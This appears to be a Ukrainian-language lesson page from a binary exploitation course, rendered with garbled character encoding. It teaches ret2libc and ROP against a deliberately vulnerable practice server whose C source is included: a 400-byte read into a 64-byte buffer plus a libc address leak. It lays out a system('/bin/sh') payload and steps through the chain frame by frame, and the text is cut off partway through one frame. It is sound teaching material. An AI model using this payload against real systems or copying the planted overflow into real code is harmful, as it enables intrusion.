# Stage 08: ret2libc - –ü–æ–≤–Ω–æ—Ü—ñ–Ω–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –∑ ROP

## üéØ –ú–µ—Ç–∞ –∑–∞–≤–¥–∞–Ω–Ω—è

–û–ø–∞–Ω—É–≤–∞—Ç–∏ **–ø–æ–≤–Ω–æ—Ü—ñ–Ω–Ω—É –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é** —Å—É—á–∞—Å–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º: –ø–æ—î–¥–Ω–∞—Ç–∏ –≤–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å, –æ–±—Ö—ñ–¥ ASLR, buffer overflow —Ç–∞ ROP (Return-Oriented Programming) –¥–ª—è –≤–∏–∫–ª–∏–∫—É —Å–∏—Å—Ç–µ–º–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π. –¶–µ –≤–µ—Ä—à–∏–Ω–∞ –Ω–∞–≤—á–∞–ª—å–Ω–æ–≥–æ –∫—É—Ä—Å—É!

## üìö –©–æ –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—å

- –©–æ —Ç–∞–∫–µ ROP (Return-Oriented Programming)
- –Ø–∫ –±—É–¥—É–≤–∞—Ç–∏ ROP chain –¥–ª—è –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ–π
- –¢–µ—Ö–Ω—ñ–∫—É ret2libc –∑ NX —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º
- Open-Read-Write (ORW) —è–∫ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—É shell
- –ß–æ–º—É ORW –Ω–∞–¥—ñ–π–Ω—ñ—à–µ –∑–∞ `system("/bin/sh")`
- –Ø–∫ –ø–æ—î–¥–Ω—É–≤–∞—Ç–∏ leak + BOF + ROP –≤ –æ–¥–∏–Ω exploit
- –†–æ–±–æ—Ç–∞ –∑ gadget'–∞–º–∏ —Ç–∞ —ó—Ö –ø–æ—à—É–∫

## üîß –ù–µ–æ–±—Ö—ñ–¥–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

```bash
# Python —Ç–∞ pwntools
pip3 install pwntools

# ROPgadget –¥–ª—è –ø–æ—à—É–∫—É gadget'—ñ–≤
pip3 install ROPgadget

# one_gadget (–æ–ø—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ)
gem install one_gadget
```

## üìñ –¢–µ–æ—Ä–µ—Ç–∏—á–Ω–∞ –æ—Å–Ω–æ–≤–∞

### –©–æ —Ç–∞–∫–µ ret2libc?

**ret2libc (return-to-libc)** - —Ç–µ—Ö–Ω—ñ–∫–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∫–æ–ª–∏ **NX —É–≤—ñ–º–∫–Ω–µ–Ω–æ** —ñ –º–∏ –Ω–µ –º–æ–∂–µ–º–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ shellcode —É —Å—Ç–µ–∫—É. –ó–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –º–∏ –≤–∏–∫–ª–∏–∫–∞—î–º–æ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ libc.

**–ü—Ä–æ–±–ª–µ–º–∞ –∑ NX:**
```c
// Stage 06: NX=OFF, –º–æ–∂–Ω–∞ shellcode
char shellcode[] = "\x48\x31\xc0...";  // execve("/bin/sh")
payload = shellcode + padding + p64(–∞–¥—Ä–µ—Å–∞_shellcode)
‚úÖ –ü—Ä–∞—Ü—é—î –±–æ —Å—Ç–µ–∫ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π

// Stage 08: NX=ON, shellcode –ù–ï –ø—Ä–∞—Ü—é—î
payload = shellcode + padding + p64(–∞–¥—Ä–µ—Å–∞_shellcode)
‚ùå Segmentation fault - —Å—Ç–µ–∫ –ù–ï –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π!
```

**–†—ñ—à–µ–Ω–Ω—è - ret2libc:**
```python
# –ó–∞–º—ñ—Å—Ç—å shellcode –≤–∏–∫–ª–∏–∫–∞—î–º–æ system("/bin/sh") –∑ libc
payload = padding + rop_chain
# rop_chain = –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π + –ø–∞—Ä–∞–º–µ—Ç—Ä–∏
‚úÖ –ü—Ä–∞—Ü—é—î –±–æ –≤–∏–∫–æ–Ω—É—î–º–æ –∫–æ–¥ –∑ libc (–≤—ñ–Ω –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π)
```

### –©–æ —Ç–∞–∫–µ ROP?

**ROP (Return-Oriented Programming)** - –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å `ret` —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π.

**–Ü–¥–µ—è:** –õ–∞–Ω—Ü—é–∂–æ–∫ `ret` "—Å—Ç—Ä–∏–±–∞—î" –ø–æ –Ω–µ–≤–µ–ª–∏–∫–∏—Ö —à–º–∞—Ç–∫–∞—Ö –∫–æ–¥—É (gadget'–∞—Ö), –∫–æ–∂–µ–Ω –∑ —è–∫–∏—Ö —Ä–æ–±–∏—Ç—å —â–æ—Å—å –∫–æ—Ä–∏—Å–Ω–µ.

```
–ù–æ—Ä–º–∞–ª—å–Ω–∞ –ø—Ä–æ–≥—Ä–∞–º–∞:
main() ‚Üí func1() ‚Üí func2() ‚Üí return

ROP chain (–º–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î–º–æ —Å—Ç–µ–∫):
gadget1 (pop rdi; ret) ‚Üí gadget2 (pop rsi; ret) ‚Üí gadget3 (system)
```

### –ê–Ω–∞—Ç–æ–º—ñ—è ROP chain

**–©–æ —Ç–∞–∫–µ gadget?**

Gadget - –∫–æ—Ä–æ—Ç–∫–∞ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π —â–æ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è `ret`:

```asm
; Gadget 1: pop rdi; ret
0x00401234:  pop  rdi     ; –ë–µ—Ä–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑—ñ —Å—Ç–µ–∫—É ‚Üí rdi
0x00401235:  ret          ; –ü–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è (—Å—Ç—Ä–∏–±–∞—î –¥–∞–ª—ñ)

; Gadget 2: pop rsi; ret
0x00401678:  pop  rsi     ; –ë–µ—Ä–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑—ñ —Å—Ç–µ–∫—É ‚Üí rsi
0x00401679:  ret

; Gadget 3: system
0x7ffff7a50d70: <system>  ; –í–∏–∫–ª–∏–∫ system()
```

**–Ø–∫ —Ü–µ –ø—Ä–∞—Ü—é—î:**

```
–°–¢–ï–ö (–Ω–∞—à payload):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ padding (72 –±–∞–π—Ç–∏)  ‚îÇ  –ó–∞–ø–æ–≤–Ω–µ–Ω–Ω—è –¥–æ saved RIP
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0x00401234          ‚îÇ  ‚Üê saved RIP: –∞–¥—Ä–µ—Å–∞ "pop rdi; ret"
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ –∞–¥—Ä–µ—Å–∞ "/bin/sh"    ‚îÇ  ‚Üê –ê—Ä–≥—É–º–µ–Ω—Ç –¥–ª—è rdi (–ø–∞—Ä–∞–º–µ—Ç—Ä system)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0x7ffff7a50d70      ‚îÇ  ‚Üê –ê–¥—Ä–µ—Å–∞ system()
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

–í–ò–ö–û–ù–ê–ù–ù–Ø:
1. return ‚Üí —Å—Ç—Ä–∏–±–æ–∫ –Ω–∞ 0x00401234
2. pop rdi     ‚Üí rdi = –∞–¥—Ä–µ—Å–∞ "/bin/sh"
3. ret         ‚Üí —Å—Ç—Ä–∏–±–æ–∫ –Ω–∞ 0x7ffff7a50d70
4. system()    ‚Üí system("/bin/sh") –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è!
```

## üíª –ê–Ω–∞–ª—ñ–∑ –∫–æ–¥—É —Å–µ—Ä–≤–µ—Ä–∞

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

void menu(void){
    puts("stage08: type LEAK to get libc address, or PAYLOAD for BOF:");
    fflush(stdout);
}

void leak(void){
    // –í–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ puts –∑ libc
    void* p = dlsym(RTLD_NEXT, "puts");
    dprintf(1, "PUTS=%p\n", p);
}

void bof(void){
    char buf[64];
    puts("send payload:");
    ssize_t n = read(0, buf, 400);  // ‚ùå BOF: 400 –±–∞–π—Ç –≤ buf[64]
    dprintf(1, "got %zd bytes\n", n);
}

int main(void){
    setbuf(stdout, NULL);
    menu();

    // –ß–∏—Ç–∞—î–º–æ –∫–æ–º–∞–Ω–¥—É
    char in[16]={0};
    if(read(0, in, sizeof(in)-1)<=0) return 0;

    if(!strncmp(in,"LEAK",4)){
        leak();        // –°–ø–æ—á–∞—Ç–∫—É leak
        bof();         // –ü–æ—Ç—ñ–º BOF
    } else if(!strncmp(in,"PAYL",4)){
        bof();         // –ê–±–æ –æ–¥—Ä–∞–∑—É BOF
    } else {
        puts("unknown");
    }

    return 0;
}
```

### –ü–æ–∫—Ä–æ–∫–æ–≤–∞ –ª–æ–≥—ñ–∫–∞

**–ï—Ç–∞–ø 1: LEAK**
```
Client: "LEAK\n"
Server: "PUTS=0x7ffff7a809c0\n"
```

**–ï—Ç–∞–ø 2: BOF**
```
Server: "send payload:\n"
Client: [padding 72] + [ROP chain]
Server: "got 400 bytes\n"
‚Üí Return –≤–∏–∫–æ–Ω—É—î ROP chain
```

## üé• –ü–æ–∫–∞–¥—Ä–æ–≤–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è ROP chain (–î–ï–¢–ê–õ–¨–ù–û!)

–¶–µ **–ù–ê–ô–í–ê–ñ–õ–ò–í–Ü–®–ê** —á–∞—Å—Ç–∏–Ω–∞ - –ø–æ–∫—Ä–æ–∫–æ–≤–µ —Ä–æ–∑—É–º—ñ–Ω–Ω—è —è–∫ –ø—Ä–∞—Ü—é—î ROP.

### –ù–∞—à payload:
```python
payload = b'A'*72 + p64(pop_rdi) + p64(binsh) + p64(system)
#         ‚îî‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îò   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îî‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îò   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò
#          padding   gadget#1      arg        function
```

### –†–æ–∑–≥–ª—è–Ω–µ –º–æ –©–û –í–Ü–î–ë–£–í–ê–Ñ–¢–¨–°–Ø –Ω–∞ –ö–û–ñ–ù–û–ú–£ —Ç–∞–∫—Ç—ñ –ø—Ä–æ—Ü–µ—Å–æ—Ä–∞:

```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–ê–î–† 0: –ü—ñ—Å–ª—è return –∑ bof() - –ü–û–ß–ê–¢–û–ö ROP CHAIN             ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë                                                               ‚ïë
‚ïë –°—Ç–µ–∫ (–ø—ñ—Å–ª—è BOF):                                             ‚ïë
‚ïë         ‚ñº RSP (stack pointer)                                 ‚ïë
‚ïë ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê 0x7ffe...f80                  ‚ïë
‚ïë ‚îÇ 0x00401234                  ‚îÇ ‚Üê –ê–¥—Ä–µ—Å–∞ gadget "pop rdi; ret"‚ïë
‚ïë ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x7ffe...f88                  ‚ïë
‚ïë ‚îÇ 0x7ffff7b98e1a              ‚îÇ ‚Üê –ê–¥—Ä–µ—Å–∞ "/bin/sh"            ‚ïë
‚ïë ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ 0x7ffe...f90                  ‚ïë
‚ïë ‚îÇ 0x7ffff7a50d70              ‚îÇ ‚Üê –ê–¥—Ä–µ—Å–∞ system()             ‚ïë
‚ïë ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                               ‚ïë
‚ïë                                                               ‚ïë
‚ïë –†–µ–≥—ñ—Å—Ç—Ä–∏ CPU:                                                 ‚ïë
‚ïë   RIP = 0x00401180 (–∞–¥—Ä–µ—Å–∞ return –≤ bof)                      ‚ïë
‚ïë   RSP = 0x7ffe...f80                                          ‚ïë
‚ïë   RDI = ???????? (–≤–∏–ø–∞–¥–∫–æ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è)                         ‚ïë
‚ïë                                                               ‚ïë
‚ïë –©–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è:                                               ‚ïë
‚ïë   return —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è –≤ bof()                                   ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
                        ‚ñº
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–ê–î–† 1: return –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è - –°–¢–†–ò–ë–û–ö –Ω–∞ gadget               ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë                                                               ‚ïë
‚ïë –Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è:                                                   ‚ïë
‚ïë   ret  ; = pop rip; jmp rip                                   ‚ïë
‚ïë                                                               ‚ïë
‚ïë –ö—Ä–æ–∫ 1.1: pop rip                                             ‚ïë
‚ïë   RIP = [RSP]        ; RIP = 0x00401234 (–∞–¥—Ä–µ—Å–∞ gadget)       ‚ïë
‚ïë   RSP += 8           ; RSP —Ç–µ–ø–µ—Ä 0x7ffe...f88                 ‚ïë
‚ïë                                                               ‚ïë
‚ïë –ö—Ä–æ–∫ 1.2: jmp rip                                             ‚ïë
‚ïë   –ü—Ä–æ—Ü–µ—Å–æ—Ä —Å—Ç—Ä–∏–±–∞—î –Ω–∞ 0x00401234                              ‚ïë
‚ïë                                                               ‚ïë
‚ïë –°—Ç–µ–∫ –ü–Ü–°–õ–Ø ret:                                               ‚ïë
‚ïë                 ‚ñº RSP                                         ‚ïë
‚ïë ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                               ‚ïë
‚ïë ‚îÇ 0x7ffff7b98e1a              ‚îÇ 0x7ffe...f88                  ‚ïë
‚ïë ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§                               ‚ïë
‚ïë ‚îÇ 0x7ffff7a50d70              ‚îÇ 0x7ffe...f90                  ‚ïë
‚ïë ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                               ‚ïë
‚ïë                                                               ‚ïë
‚ïë –†–µ–≥—ñ—Å—Ç—Ä–∏:                                                     ‚ïë
‚ïë   RIP = 0x00401234 (–≤–∫–∞–∑—É—î –Ω–∞ "pop rdi")                      ‚ïë
‚ïë   RSP = 0x7ffe...f88                                          ‚ïë
‚ïë   RDI = ???????? (—â–µ –Ω–µ –∑–º—ñ–Ω–µ–Ω–æ)                              ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
                        ‚ñº
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–ê–î–† 2: –í–∏–∫–æ–Ω—É—î—Ç—å—Å—è gadget "pop rdi"                         ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë                                                               ‚ïë
‚ïë –ö–æ–¥ –∑–∞ –∞–¥—Ä–µ—Å–æ—é 0x00401234:                                    ‚ïë
‚ïë   0x00401234:  pop  rdi    ; –í–∏—Ç—è–≥—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∑—ñ —Å—Ç–µ–∫—É ‚Üí RDI ‚ïë
‚ïë   0x00401235:  ret         ; –ü–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è (—Å—Ç—Ä–∏–±–æ–∫ –¥–∞–ª—ñ)      ‚ïë
‚ïë                                                               ‚ïë
‚ïë –ö—Ä–æ–∫ 2.1: pop rdi                                             ‚ïë
‚ïë   RDI = [RSP]        ; RDI = 0x7ffff7b98e1a (–∞–¥—Ä–µ—Å–∞ "/bin/sh")‚ïë
‚ïë   RSP += 8           ; RSP —Ç–µ–ø–µ—Ä 0x7ffe...f90                 ‚ïë
‚ïë                                                               ‚ïë
‚ïë –°—Ç–µ–∫ –ü–Ü–°–õ–Ø pop rdi:                                           ‚ïë
‚ïë                         ‚ñº RSP                                 ‚ïë
‚ïë ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                               ‚ïë
‚ïë ‚îÇ 0x7ffff7a50d70              ‚îÇ 0x7ffe...f90                  ‚ïë
‚ïë ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                               ‚ïë
‚ïë                                                               ‚ïë
‚ïë –†–µ–≥—ñ—Å—Ç—Ä–∏:                                                     ‚ïë
‚ïë   RIP = 0x00401235 (–≤–∫–∞–∑—É—î –Ω–∞ "ret")                          ‚ïë
‚ïë   RSP = 0x7ffe...f90                                          ‚ïë
‚ïë   RDI = 0x7ffff7b98e1a ‚úì  ‚Üê –ü–ê–†–ê–ú–ï–¢–† –ì–û–¢–û–í–ò–ô!                ‚ïë
‚ïë                                                               ‚ïë
‚ïë –ü–æ—è—Å–Ω–µ–Ω–Ω—è:                                                    ‚ïë
‚ïë   RDI —Ç–µ–ø–µ—Ä –º—ñ—Å—Ç–∏—Ç—å –∞–¥—Ä–µ—Å—É "/bin/sh" - –ø–µ—Ä—à–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è   ‚ïë
‚ïë   –º–∞–π–±—É—Ç–Ω—å–æ–≥–æ –≤–∏–∫–ª–∏–∫—É system()                                ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
                        ‚ñº
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–ê–î–† 3: –í–∏–∫–æ–Ω—É—î—Ç—å—Å—è "ret" –≤ gadget - –°–¢–†–ò–ë–û–ö –Ω–∞ system       ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë                                                               ‚ïë
‚ïë –Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è:                                                   ‚ïë
‚ïë   0x00401235:  ret  ; = pop rip; jmp rip                      ‚ïë
‚ïë                                                               ‚ïë
‚ïë –ö—Ä–æ–∫ 3.1: pop rip                                             ‚ïë
‚ïë   RIP = [RSP]        ; RIP = 0x7ffff7a50d70 (–∞–¥—Ä–µ—Å–∞ system)   ‚ïë
‚ïë   RSP += 8           ; RSP —Ç–µ–ø–µ—Ä 0x7ffe...f98                 ‚ïë
‚ïë                                                               ‚ïë
